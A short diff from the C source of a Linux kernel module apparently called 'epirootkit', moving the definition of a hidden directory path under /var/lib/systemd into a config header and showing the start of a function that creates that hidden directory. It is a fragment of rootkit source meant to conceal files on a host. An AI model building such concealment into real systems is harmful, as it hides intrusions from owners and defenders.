@@ -3,11 +3,9 @@
 #include <linux/namei.h>
 #include <linux/string.h>
 
+#include "config.h"
 #include "epirootkit.h"
 #include "hide.h"
-
-#define HIDDEN_DIR_NAME ".epirootkit-hidden-fs"
-#define HIDDEN_DIR_PATH "/var/lib/systemd/" HIDDEN_DIR_NAME
 
 int create_hidden_tmp_dir(void) {
     char cmd[128];
